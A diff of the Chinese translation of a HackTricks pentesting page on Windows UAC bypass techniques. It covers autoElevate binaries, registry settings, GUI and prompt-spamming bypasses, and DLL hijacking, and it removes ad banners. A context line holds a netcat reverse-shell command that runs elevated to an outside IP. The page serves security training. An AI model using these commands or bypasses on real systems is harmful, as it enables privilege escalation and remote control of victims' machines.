@@ -2,16 +2,9 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-使用 [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) 轻松构建和 **自动化工作流**，由世界上 **最先进** 的社区工具提供支持。\
-立即获取访问权限：
-
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
-
 ## UAC
 
-[用户帐户控制 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一个功能，允许 **提升活动的同意提示**。应用程序具有不同的 `integrity` 级别，具有 **高级别** 的程序可以执行 **可能危害系统** 的任务。当 UAC 启用时，应用程序和任务始终 **在非管理员帐户的安全上下文中运行**，除非管理员明确授权这些应用程序/任务以管理员级别访问系统进行运行。这是一个便利功能，可以保护管理员免受意外更改，但不被视为安全边界。
+[用户帐户控制 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一个功能，允许**提升活动的同意提示**。应用程序具有不同的 `integrity` 级别，具有**高级别**的程序可以执行**可能危害系统**的任务。当 UAC 启用时，应用程序和任务始终**在非管理员帐户的安全上下文中运行**，除非管理员明确授权这些应用程序/任务以管理员级别访问系统进行运行。这是一个便利功能，可以保护管理员免受意外更改，但不被视为安全边界。
 
 有关完整性级别的更多信息：
 
@@ -29,7 +22,7 @@
 | [用户帐户控制：允许 UIAccess 应用程序在不使用安全桌面的情况下提示提升](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | 禁用                                                     |
 | [用户帐户控制：管理员在管理员批准模式下的提升提示行为](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | 对非 Windows 二进制文件提示同意                  |
 | [用户帐户控制：标准用户的提升提示行为](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | 在安全桌面上提示凭据                 |
-| [用户帐户控制：检测应用程序安装并提示提升](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | 启用（家庭版默认） 禁用（企业版默认） |
+| [用户帐户控制：检测应用程序安装并提示提升](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | 启用（家庭版默认）禁用（企业版默认） |
 | [用户帐户控制：仅提升已签名和验证的可执行文件](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | 禁用                                                     |
 | [用户帐户控制：仅提升安装在安全位置的 UIAccess 应用程序](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | 启用                                                      |
 | [用户帐户控制：在管理员批准模式下运行所有管理员](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | 启用                                                      |
@@ -38,11 +31,11 @@
 
 ### UAC 绕过理论
 
-一些程序会在 **用户属于** **管理员组** 时 **自动提升**。这些二进制文件在其 _**清单**_ 中具有 _**autoElevate**_ 选项，值为 _**True**_。该二进制文件还必须 **由 Microsoft 签名**。
+一些程序会在**用户属于** **管理员组**时**自动提升**。这些二进制文件在其 _**Manifests**_ 中具有 _**autoElevate**_ 选项，值为 _**True**_。该二进制文件还必须**由 Microsoft 签名**。
 
-然后，为了 **绕过** **UAC**（从 **中等** 完整性级别 **提升到高**），一些攻击者使用这种二进制文件来 **执行任意代码**，因为它将从 **高完整性级别进程** 中执行。
+然后，为了**绕过** **UAC**（从**中等**完整性级别**提升到高**），一些攻击者使用这种二进制文件来**执行任意代码**，因为它将从**高完整性级别进程**中执行。
 
-您可以使用 Sysinternals 的工具 _**sigcheck.exe**_ 检查二进制文件的 _**清单**_。您可以使用 _Process Explorer_ 或 _Process Monitor_（来自 Sysinternals）查看进程的 **完整性级别**。
+您可以使用 Sysinternals 的工具 _**sigcheck.exe**_ 检查二进制文件的 _**Manifest**_。您可以使用 _Process Explorer_ 或 _Process Monitor_（Sysinternals）查看进程的**完整性级别**。
 
 ### 检查 UAC
 
@@ -92,11 +85,11 @@ whoami /groups | findstr Level
 ## UAC 绕过
 
 > [!NOTE]
-> 请注意，如果您可以图形访问受害者，UAC 绕过是直接的，因为您可以在 UAC 提示出现时简单地点击“是”
+> 请注意，如果您可以图形访问受害者，UAC 绕过是直接的，因为您只需在 UAC 提示出现时单击“是”
 
 在以下情况下需要 UAC 绕过：**UAC 已激活，您的进程在中等完整性上下文中运行，并且您的用户属于管理员组**。
 
-重要的是要提到，如果 UAC 处于最高安全级别（始终），则**绕过 UAC 要比在其他任何级别（默认）要困难得多**。
+重要的是要提到，如果 UAC 处于最高安全级别（始终），则**绕过 UAC 要比在其他任何级别（默认）下要困难得多**。
 
 ### UAC 禁用
 
@@ -113,7 +106,7 @@ Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10
 
 ### **非常** 基本的 UAC "绕过"（完全文件系统访问）
 
-如果你有一个属于管理员组的用户的 shell，你可以 **通过 SMB 挂载 C$** 共享到一个新的磁盘上，你将 **访问文件系统中的所有内容**（甚至是管理员的主文件夹）。
+如果你有一个属于管理员组的用户的 shell，你可以 **通过 SMB 挂载 C$** 共享到一个新的磁盘上，这样你将 **访问到文件系统中的所有内容**（甚至是管理员的主文件夹）。
 
 > [!WARNING]
 > **看起来这个技巧不再有效**
@@ -157,48 +150,41 @@ Major  Minor  Build  Revision
 -----  -----  -----  --------
 10     0      14393  0
 ```
-也可以使用[这个](https://en.wikipedia.org/wiki/Windows_10_version_history)页面从构建版本中获取Windows版本`1607`。
+也可以使用 [this](https://en.wikipedia.org/wiki/Windows_10_version_history) 页面获取 Windows 版本 `1607` 的构建版本。
 
-#### 更多UAC绕过
+#### 更多 UAC 绕过
 
-**所有**用于绕过AUC的技术**都需要**与受害者的**完整交互式Shell**（普通的nc.exe Shell不够）。
+**所有**用于绕过 AUC 的技术 **需要**与受害者的 **完整交互式 shell**（普通的 nc.exe shell 不够）。
 
-您可以使用**meterpreter**会话获取。迁移到**Session**值等于**1**的**进程**：
+您可以使用 **meterpreter** 会话获取。迁移到 **Session** 值等于 **1** 的 **进程**：
 
 ![](<../../images/image (863).png>)
 
-（_explorer.exe_ 应该可以工作）
+(_explorer.exe_ 应该可以工作)
 
-### 带GUI的UAC绕过
+### 带 GUI 的 UAC 绕过
 
-如果您可以访问**GUI，您只需在出现UAC提示时接受它**，您实际上不需要绕过它。因此，获取对GUI的访问将允许您绕过UAC。
+如果您可以访问 **GUI，您只需在出现 UAC 提示时接受它**，您实际上不需要绕过它。因此，获取对 GUI 的访问将允许您绕过 UAC。
 
-此外，如果您获得了某人正在使用的GUI会话（可能通过RDP），则有**一些工具将以管理员身份运行**，您可以**直接以管理员身份运行**例如**cmd**，而无需再次被UAC提示，如[**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)。这可能会更加**隐蔽**。
+此外，如果您获得了某人正在使用的 GUI 会话（可能通过 RDP），则有 **一些工具将以管理员身份运行**，您可以 **直接以管理员身份运行** 例如 **cmd**，而无需再次被 UAC 提示，如 [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)。这可能会更 **隐蔽**。
 
-### 嘈杂的暴力破解UAC绕过
+### 嘈杂的暴力破解 UAC 绕过
 
-如果您不在乎嘈杂，您可以始终**运行类似**[**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin)的工具，该工具**请求提升权限，直到用户接受它**。
+如果您不在乎嘈杂，您可以始终 **运行类似** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) 的工具，该工具 **请求提升权限，直到用户接受它**。
 
-### 您自己的绕过 - 基本UAC绕过方法
+### 您自己的绕过 - 基本 UAC 绕过方法
 
-如果您查看**UACME**，您会注意到**大多数UAC绕过利用了Dll劫持漏洞**（主要是在_C:\Windows\System32_中写入恶意dll）。[阅读此内容以了解如何找到Dll劫持漏洞](../windows-local-privilege-escalation/dll-hijacking/)。
+如果您查看 **UACME**，您会注意到 **大多数 UAC 绕过利用 Dll Hijacking 漏洞**（主要是在 _C:\Windows\System32_ 中写入恶意 dll）。 [阅读此内容以了解如何找到 Dll Hijacking 漏洞](../windows-local-privilege-escalation/dll-hijacking/)。
 
-1. 找到一个将**自动提升**的二进制文件（检查它执行时是否以高完整性级别运行）。
-2. 使用procmon查找可能受到**DLL劫持**影响的“**NAME NOT FOUND**”事件。
-3. 您可能需要在某些**受保护路径**（如C:\Windows\System32）中**写入**DLL，而您没有写入权限。您可以使用以下方法绕过此限制：
-   1. **wusa.exe**：Windows 7、8和8.1。它允许在受保护路径中提取CAB文件的内容（因为此工具是以高完整性级别执行的）。
+1. 找到一个会 **自动提升** 的二进制文件（检查它执行时是否以高完整性级别运行）。
+2. 使用 procmon 查找可能受到 **DLL Hijacking** 影响的 "**NAME NOT FOUND**" 事件。
+3. 您可能需要在某些 **受保护路径**（如 C:\Windows\System32）中 **写入** DLL，而您没有写入权限。您可以使用以下方法绕过此限制：
+   1. **wusa.exe**：Windows 7、8 和 8.1。它允许在受保护路径中提取 CAB 文件的内容（因为此工具是以高完整性级别执行的）。
    2. **IFileOperation**：Windows 10。
-4. 准备一个**脚本**，将您的DLL复制到受保护路径中，并执行易受攻击的自动提升二进制文件。
+4. 准备一个 **脚本** 将您的 DLL 复制到受保护路径并执行易受攻击的自动提升二进制文件。
 
-### 另一种UAC绕过技术
+### 另一种 UAC 绕过技术
 
-该技术是观察一个**自动提升的二进制文件**是否尝试从**注册表**中**读取**要**执行**的**二进制文件**或**命令**的**名称/路径**（如果该二进制文件在**HKCU**中搜索此信息，则更有趣）。
-
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-使用[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)轻松构建和**自动化工作流程**，由世界上**最先进**的社区工具提供支持。\
-立即获取访问权限：
-
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+该技术是观察一个 **自动提升的二进制文件** 是否尝试 **从注册表** 中 **读取** 要 **执行** 的 **二进制文件** 或 **命令** 的 **名称/路径**（如果二进制文件在 **HKCU** 中搜索此信息，则更有趣）。
 
 {{#include ../../banners/hacktricks-training.md}}
